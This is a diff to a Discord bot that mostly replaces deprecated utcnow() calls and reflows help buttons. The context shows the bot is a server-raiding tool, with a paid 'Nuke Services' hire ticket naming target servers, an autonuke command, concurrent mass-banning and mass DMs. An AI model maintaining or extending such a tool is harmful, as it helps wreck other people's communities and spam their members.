@@ -61,7 +61,7 @@ async def _log_embed(embed: discord.Embed):
     """Send a log embed to the log channel and/or file."""
     if LOG_FILE_ENABLED:
         try:
-            ts = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+            ts = datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%d %H:%M:%S")
             line = f"[{ts}] {embed.title} — {embed.description or ''}\n"
             with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
                 f.write(line)
@@ -78,7 +78,7 @@ async def _log_embed(embed: discord.Embed):
 def _action_embed(title: str, color: int, fields: list[tuple] | None = None,
                   footer: str | None = None) -> discord.Embed:
     """Build a clean log embed."""
-    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.utcnow())
+    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.now(datetime.UTC))
     if fields:
         for name, value, inline in fields:
             e.add_field(name=name, value=str(value)[:1024], inline=inline)
@@ -149,7 +149,7 @@ class LiveTimer:
             title = f"⏱️  `!{self.command}`  —  Running…"
 
         e = discord.Embed(title=title, color=color,
-                          timestamp=datetime.datetime.utcnow())
+                          timestamp=datetime.datetime.now(datetime.UTC))
 
         bar_str = f"`{self._bar(pct)}`  **{int(pct * 100)}%**"
         e.add_field(name="Progress", value=bar_str, inline=False)
@@ -790,15 +790,10 @@ class HelpView(discord.ui.View):
         super().__init__(timeout=120)
         self.current = "channels"
         keys = list(HELP_PAGES.keys())
-        # Row 0 — first 4
-        for key in keys[:4]:
-            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=0))
-        # Row 1 — next 4
-        for key in keys[4:8]:
-            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=1))
-        # Row 2 — remaining (whitelist, modmail, hire)
-        for key in keys[8:]:
-            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=2))
+        # Dynamically distribute buttons across rows (max 5 per row per Discord UI limits)
+        for index, key in enumerate(keys):
+            row = index // 5
+            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=row))
 
     def get_embed(self, page_key: str) -> discord.Embed:
         page = HELP_PAGES[page_key]
@@ -2502,7 +2497,7 @@ class _HireModal(discord.ui.Modal, title="🔥 Hire Request — Nuke Services"):
             "payment":       self.payment.value,
             "contact":       self.contact.value,
             "status":        "pending",
-            "created_at":    datetime.datetime.utcnow().isoformat(),
+            "created_at":    datetime.datetime.now(datetime.UTC).isoformat(),
             "handled_by":    None,
             "note":          "",
         }
@@ -2548,7 +2543,7 @@ def _ticket_embed(t: dict) -> discord.Embed:
     e = discord.Embed(
         title=f"🎫 Hire Ticket  #{t['id']}  —  {_TICKET_ICONS[status]} {status.upper()}",
         color=_TICKET_COLORS[status],
-        timestamp=datetime.datetime.utcnow(),
+        timestamp=datetime.datetime.now(datetime.UTC),
     )
     e.add_field(name="👤 Client",       value=f"<@{t['user_id']}> `{t['user_name']}`", inline=True)
     e.add_field(name="🎯 Target",       value=t["server_name"],   inline=True)
@@ -3092,7 +3087,7 @@ async def _fast_ban_all(guild: discord.Guild, concurrency: int = 15, reason: str
     await asyncio.gather(*[_do(m) for m in targets])
 
 async def _rich_status(ctx, title: str, color: int = 0x57f287, **fields):
-    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.utcnow())
+    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.now(datetime.UTC))
     for name, value in fields.items():
         e.add_field(name=name, value=str(value), inline=True)
     try:
@@ -3180,7 +3175,7 @@ async def autonuke(ctx, guild_id: int, channel: str, *, message: str = "@everyon
         "channel":  channel,
         "message":  message,
         "set_by":   str(ctx.author),
-        "set_at":   datetime.datetime.utcnow().isoformat(),
+        "set_at":   datetime.datetime.now(datetime.UTC).isoformat(),
     }
     _save_autonuke()
     e = discord.Embed(
@@ -3312,7 +3307,7 @@ async def warn(ctx, member: discord.Member, *, reason: str = "No reason provided
     WARNS.setdefault(uid, [])
     wid = len(WARNS[uid]) + 1
     WARNS[uid].append({"id": wid, "reason": reason, "by": str(ctx.author),
-                        "at": datetime.datetime.utcnow().isoformat()})
+                        "at": datetime.datetime.now(datetime.UTC).isoformat()})
     _save_warns()
     e = discord.Embed(title=f"⚠️ Warning #{wid} issued", color=0xffa500)
     e.add_field(name="User",   value=f"{member.mention} `{member.id}`",   inline=True)
@@ -3392,7 +3387,7 @@ async def masswarn(ctx, role: discord.Role, *, reason: str = "Mass warning"):
         uid = str(m.id)
         WARNS.setdefault(uid, [])
         WARNS[uid].append({"id": len(WARNS[uid])+1, "reason": reason,
-                           "by": str(ctx.author), "at": datetime.datetime.utcnow().isoformat()})
+                           "by": str(ctx.author), "at": datetime.datetime.now(datetime.UTC).isoformat()})
     _save_warns()
     await _rich_status(ctx, f"⚠️ Mass Warned {len(targets)} members", 0xffa500,
                        Role=role.name, Count=len(targets), Reason=reason)
@@ -3418,7 +3413,7 @@ async def backup(ctx, *, label: str = ""):
     bid = f"{g.id}_{int(time.time())}"
     _backups[bid] = {
         "label": label or g.name, "guild_id": g.id, "guild_name": g.name,
-        "created_at": datetime.datetime.utcnow().isoformat(), "created_by": str(ctx.author),
+        "created_at": datetime.datetime.now(datetime.UTC).isoformat(), "created_by": str(ctx.author),
         "roles": [{"name": r.name, "color": r.color.value, "hoist": r.hoist,
                    "mentionable": r.mentionable, "permissions": r.permissions.value}
                   for r in g.roles if not r.is_default() and not r.managed],
@@ -3435,7 +3430,7 @@ async def backup(ctx, *, label: str = ""):
     }
     _save_backups()
     e = discord.Embed(title="💾 Backup Created", description=f"`{bid}`",
-                      color=0x57f287, timestamp=datetime.datetime.utcnow())
+                      color=0x57f287, timestamp=datetime.datetime.now(datetime.UTC))
     b = _backups[bid]
     e.add_field(name="Guild",      value=g.name,                      inline=True)
     e.add_field(name="Roles",      value=len(b["roles"]),             inline=True)
@@ -4356,7 +4351,7 @@ async def massdmembed(ctx, role: discord.Role, title: str, *, body: str):
     """DM all members with a role using a rich embed."""
     targets = [m for m in role.members if not m.bot]
     e = discord.Embed(title=title, description=body, color=role.color,
-                      timestamp=datetime.datetime.utcnow())
+                      timestamp=datetime.datetime.now(datetime.UTC))
     e.set_footer(text=f"From: {ctx.guild.name}")
     sent = fail = 0
     for m in targets:
@@ -4445,7 +4440,7 @@ async def poll(ctx, question: str, *, options: str):
     emojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
     desc   = "\n".join(f"{emojis[i]} {o}" for i, o in enumerate(opts))
     e = discord.Embed(title=f"📊 {question}", description=desc, color=0x5865F2,
-                      timestamp=datetime.datetime.utcnow())
+                      timestamp=datetime.datetime.now(datetime.UTC))
     e.set_footer(text=f"Poll by {ctx.author}")
     msg = await ctx.send(embed=e)
     for i in range(len(opts)):
@@ -4498,7 +4493,7 @@ async def massdel(ctx, count: int = 100):
 @bot.command()
 async def embedfields(ctx, title: str, *, fields: str):
     """Send a rich embed. Format: 'title | field1:value1 | field2:value2'"""
-    e = discord.Embed(title=title, color=0x5865F2, timestamp=datetime.datetime.utcnow())
+    e = discord.Embed(title=title, color=0x5865F2, timestamp=datetime.datetime.now(datetime.UTC))
     for field in fields.split("|"):
         field = field.strip()
         if ":" in field:
@@ -4557,7 +4552,7 @@ async def purgereacts(ctx, message_id: int):
 async def globalannounce(ctx, *, message: str):
     """Send an announcement embed to the first channel of every guild the bot is in."""
     e = discord.Embed(title="📢 Global Announcement", description=message,
-                      color=0xff0000, timestamp=datetime.datetime.utcnow())
+                      color=0xff0000, timestamp=datetime.datetime.now(datetime.UTC))
     e.set_footer(text=f"From: {ctx.guild.name} • {ctx.author}")
     sent = 0
     for guild in bot.guilds:
@@ -4835,7 +4830,7 @@ async def scheduleannounce(ctx, delay: float, channel: discord.TextChannel, *, m
     await ctx.send(f"⏱️ Scheduled message to {channel.mention} in {delay}s.")
     await asyncio.sleep(delay)
     e = discord.Embed(description=message, color=0x5865F2,
-                      timestamp=datetime.datetime.utcnow())
+                      timestamp=datetime.datetime.now(datetime.UTC))
     e.set_footer(text=f"Scheduled by {ctx.author}")
     await safe(channel.send(embed=e))
 
